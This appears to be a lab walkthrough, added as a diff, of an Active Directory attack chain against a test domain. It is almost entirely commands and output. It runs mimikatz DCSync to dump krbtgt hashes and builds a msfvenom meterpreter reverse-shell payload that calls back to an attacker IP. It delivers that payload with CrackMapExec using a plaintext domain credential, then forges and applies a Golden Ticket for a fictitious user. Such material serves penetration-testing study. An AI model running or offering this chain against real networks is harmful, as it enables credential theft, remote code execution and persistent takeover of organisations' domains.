@@ -1,0 +1,325 @@
+************************************ DCsync technique & Golden Ticket with Mimikatz ******************************************
+
+=> Any member of Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts are able to run DCSync to pull password data.
+=> DCSync rather than executing recognizable malicious code, the action works by abusing the domain controller's application programming interface (API) [8] [9] [10] [11] to simulate the replication process from a remote domain controller.
+
+
+C:\temp>mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #18362 Mar  8 2020 18:30:37
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/
+
+mimikatz # lsadump::dcsync /domain:SECURITY-LAB /user:krbtgt
+ERROR kuhl_m_lsadump_dcsync ; Domain not present, or doesn't look like a FQDN
+
+mimikatz # lsadump::dcsync /domain:Security-Test-Lab.Local /user:krbtgt
+[DC] 'Security-Test-Lab.Local' will be the domain
+[DC] 'TEMP-DC.Security-Test-Lab.Local' will be the DC server
+[DC] 'krbtgt' will be the user account
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   :
+Password last change : 4/15/2020 9:00:23 AM
+Object Security ID   : S-1-5-21-3698357007-189532211-3203426890-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 208ae4a2c5aa7b40d04<SNIP>
+    ntlm- 0: 208ae4a2c5aa7b40d04<SNIP>
+    lm  - 0: bb25cb33e1e02367f2f<SNIP>
+
+Supplemental Credentials:
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : SECURITY-TEST-LAB.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 66d811ed48e35423189b76966007f30e8f<SNIP>
+251e78463bc035f86
+      aes128_hmac       (4096) : 082cb2101def04a88c03<SNIP>
+      des_cbc_md5       (4096) : 9dc1d9d5<SNIP>
+
+* Primary:Kerberos *
+    Default Salt : SECURITY-TEST-LAB.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : 9dc1d9d51a02526d
+
+* Packages *
+    Kerberos-Newer-Keys
+
+* Primary:WDigest *
+    01  833a64810968bd01d8917e71df3a3a0f
+    02  cc303209fcd2968837da6ddeb2705031
+    03  390c5377c72d0f26f3b937d600610878
+    04  833a64810968bd01d8917e71df3a3a0f
+    05  cc303209fcd2968837da6ddeb2705031
+    06  56a676482fb30552c4966e8425c1fe5d
+    07  833a64810968bd01d8917e71df3a3a0f
+    08  361e88d9e78c4846bf0ac4535c6fdf7e
+    09  8a4821a6bc2b104ab85c2c6453568d00
+    10  70ea2bbf430b268f08da5458b4227102
+    11  35ea978eb485e93c8f20733868232b6c
+    12  8a4821a6bc2b104ab85c2c6453568d00
+    13  dd666c27a719ef160a17b1a7b546c9ce
+    14  35ea978eb485e93c8f20733868232b6c
+    15  c25515f2f2e7b70b52c95a61a32693f7
+    16  193a5436835ae8fe1c016813434fd49d
+    17  2c59667d017aea577747466db6c74443
+    18  d081ae9ac001033ff5861ef9aa633060
+    19  959f921154ecffe4f594523acc9c8d63
+    20  855207ea83aaa4c6c9c723983544b07b
+    21  604949a54b0dad9ab883b7574ae79353
+    22  604949a54b0dad9ab883b7574ae79353
+    23  fc3c4c20706ce27f2df86f4ea1b355cd
+    24  c851d0b79300b9d98253d8b596963151
+    25  b73cb4c1c0a1b88d012f68fa3f83df2c
+    26  75461c7056aec052868f0ffb4c59e0e2
+    27  49ae4041d1b62feaf2c5dfc84f04db74
+    28  6e02d520264061d03d00c7fe140355f5
+    29  8048c0030328f1056cdf<SNIP>
+
+mimikatz #
+
+==================================================================================================================================== 
+
+Reverse shell execution in memory (a valid domain account member of the 'local admin' is required) 
+
+Step 1. create a meterpreter payload
+=====================================
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.22 LPORT=8443 -f exe > payload_tcp.exe
+
+
+Step 2. Run a metasploit handler
+=====================================
+msf5 exploit(multi/handler) > options
+
+Module options (exploit/multi/handler):
+
+   Name  Current Setting  Required  Description
+   ----  ---------------  --------  -----------
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.1.22     yes       The listen address (an interface may be specified)
+   LPORT     8443             yes       The listen port
+
+Exploit target:
+   Id  Name
+   --  ----
+   0   Wildcard Target
+
+
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.1.22:8443 
+...
+
+
+Step 3. Execute the payload using CrackMapExec or WmiExec etc.
+===============================================================
+
+jeff@kali:~/Documents/CTFs/BadBlood$ sudo crackmapexec smb 192.168.1.50 -u Qualys -p Qua1ys2020 -M pe_inject -o PATH=./payload_tcp.exe
+SMB         192.168.1.50    445    TEMP-DC          [*] Windows Server 2012 R2 Standard 9600 x64 (name:TEMP-DC) (domain:SECURITY-LAB) (signing:True) (SMBv1:True)
+SMB         192.168.1.50    445    TEMP-DC          [+] SECURITY-LAB\Qualys:Qua1ys2020 (Pwn3d!)
+PE_INJEC... 192.168.1.50    445    TEMP-DC          [+] Executed payload
+PE_INJEC...                                         [*] Waiting on 1 host(s)
+PE_INJEC... 192.168.1.50                            [*] - - "GET /Invoke-ReflectivePEInjection.ps1 HTTP/1.1" 200 -
+PE_INJEC... 192.168.1.50                            [*] - - "GET /payload_tcp.exe HTTP/1.1" 200 -
+jeff@kali:~/Documents/CTFs/BadBlood$ 
+
+
+
+Step 4. Obtain  meterpreter reverse shell
+=========================================
+
+[*] Started reverse TCP handler on 192.168.1.22:8443 
+[*] Sending stage (180291 bytes) to 192.168.1.50
+[*] Meterpreter session 1 opened (192.168.1.22:8443 -> 192.168.1.50:49174) at 2020-04-18 03:02:07 +0200
+
+meterpreter > getuid
+Server username: SECURITY-LAB\Qualys
+
+meterpreter > getprivs
+
+Enabled Process Privileges
+==========================
+Name
+----
+SeBackupPrivilege
+SeChangeNotifyPrivilege
+SeCreateGlobalPrivilege
+SeCreatePagefilePrivilege
+SeCreateSymbolicLinkPrivilege
+SeDebugPrivilege
+SeEnableDelegationPrivilege
+SeImpersonatePrivilege
+SeIncreaseBasePriorityPrivilege
+SeIncreaseQuotaPrivilege
+SeIncreaseWorkingSetPrivilege
+SeLoadDriverPrivilege
+SeMachineAccountPrivilege
+SeManageVolumePrivilege
+SeProfileSingleProcessPrivilege
+SeRemoteShutdownPrivilege
+SeRestorePrivilege
+SeSecurityPrivilege
+SeShutdownPrivilege
+SeSystemEnvironmentPrivilege
+SeSystemProfilePrivilege
+SeSystemtimePrivilege
+SeTakeOwnershipPrivilege
+SeTimeZonePrivilege
+SeUndockPrivilege
+
+
+
+
+Step 5. Load Mikitaz 'KIWI' extension and run DCsync commands
+==============================================================
+
+meterpreter > load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x86/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+[!] Loaded x86 Kiwi on an x64 architecture.
+Success.
+
+meterpreter > dcsync_ntlm krbtgt
+
+[+] Account   : krbtgt
+[+] NTLM Hash : 208ae4a2c5aa7b40d04734<SNIP>
+[+] LM Hash   : bb25cb33e1e02367f2fc2a<SNIP>
+[+] SID       : S-1-5-21-3698357007-189532211-3203426890-502
+[+] RID       : 502
+
+
+meterpreter > dcsync krbtgt
+
+[DC] 'Security-Test-Lab.Local' will be the domain
+[DC] 'TEMP-DC.Security-Test-Lab.Local' will be the DC server
+[DC] 'krbtgt' will be the user account
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   : 
+Password last change : 4/15/2020 9:00:23 AM
+Object Security ID   : S-1-5-21-3698357007-189532211-3203426890-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: 208ae4a2c5aa7b40d047349<SNIP>
+    ntlm- 0: 208ae4a2c5aa7b40d047349<SNIP>
+    lm  - 0: bb25cb33e1e02367f2fc2af<SNIP>
+
+Supplemental Credentials:
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : SECURITY-TEST-LAB.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : 66d811ed48e35423189b76966007f30e8feab5c14d66c332<SNIP>
+      aes128_hmac       (4096) : 082cb2101def04a88c035eb2<SNIP>
+      des_cbc_md5       (4096) : 9dc1d9d51a<SNIP>
+
+* Primary:Kerberos *
+    Default Salt : SECURITY-TEST-LAB.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : 9dc1d9d51a02526d
+
+* Packages *
+    Kerberos-Newer-Keys
+
+* Primary:WDigest *
+    01  833a64810968bd01d8917e71df3a3a0f
+    02  cc303209fcd2968837da6ddeb2705031
+    03  390c5377c72d0f26f3b937d600610878
+    04  833a64810968bd01d8917e71df3a3a0f
+    05  cc303209fcd2968837da6ddeb2705031
+    06  56a676482fb30552c4966e8425c1fe5d
+    07  833a64810968bd01d8917e71df3a3a0f
+    08  361e88d9e78c4846bf0ac4535c6fdf7e
+    09  8a4821a6bc2b104ab85c2c6453568d00
+    10  70ea2bbf430b268f08da5458b4227102
+    11  35ea978eb485e93c8f20733868232b6c
+    12  8a4821a6bc2b104ab85c2c6453568d00
+    13  dd666c27a719ef160a17b1a7b546c9ce
+    14  35ea978eb485e93c8f20733868232b6c
+    15  c25515f2f2e7b70b52c95a61a32693f7
+    16  193a5436835ae8fe1c016813434fd49d
+    17  2c59667d017aea577747466db6c74443
+    18  d081ae9ac001033ff5861ef9aa633060
+    19  959f921154ecffe4f594523acc9c8d63
+    20  855207ea83aaa4c6c9c723983544b07b
+    21  604949a54b0dad9ab883b7574ae79353
+    22  604949a54b0dad9ab883b7574ae79353
+    23  fc3c4c20706ce27f2df86f4ea1b355cd
+    24  c851d0b79300b9d98253d8b596963151
+    25  b73cb4c1c0a1b88d012f68fa3f83df2c
+    26  75461c7056aec052868f0ffb4c59e0e2
+    27  49ae4041d1b62feaf2c5dfc84f04db74
+    28  6e02d520264061d03d00c7fe140355f5
+    29  8048c0030328f1056cdf<SNIP>
+
+
+Step 6. Create a Golden Ticket (Useful link: https://pentestlab.blog/2018/04/09/golden-ticket/)
+=================================================================================================
+
+meterpreter > kerberos_ticket_purge
+[+] Kerberos tickets purged
+
+meterpreter > kerberos_ticket_list
+[-] No kerberos tickets exist in the current session.
+
+
+=> A Golden Ticket can be created for the non-existent user 'hackerboy' by executing the following command:
+-----------------------------------------------------------------------------------------------------------
+
+meterpreter > golden_ticket_create -d SECURITY-TEST-LAB.LOCAL -u hackerboy -s -1-5-21-3698357007-189532211-3203426890 -k 208ae4a2c5aa7b40d0473499408a2670 -t /tmp/GoldenTicket.tck
+[+] Golden Kerberos ticket written to /tmp/GoldenTicket.tck
+
+meterpreter > 
+
+
+=> Apply the ticket to the existing session:
+--------------------------------------------
+
+meterpreter > kerberos_ticket_use /tmp/GoldenTicket.tck
+[*] Using Kerberos ticket stored in /tmp/GoldenTicket.tck, 1136 bytes ...
+[+] Kerberos ticket applied successfully.
+
+meterpreter > kerberos_ticket_list
+[+] Kerberos tickets found in the current session.
+[00000000] - 0x00000017 - rc4_hmac_nt      
+   Start/End/MaxRenew: 5/26/2020 10:11:25 PM ; 5/25/2030 6:11:25 AM ; 5/25/2030 6:11:25 AM
+   Server Name       : krbtgt/SECURITY-TEST-LAB.LOCAL @ SECURITY-TEST-LAB.LOCAL
+   Client Name       : hackerboy @ SECURITY-TEST-LAB.LOCAL
+   Flags 40e00000    : pre_authent ; initial ; renewable ; forwardable ;
+
+meterpreter > 
+
+
+
+
+
+
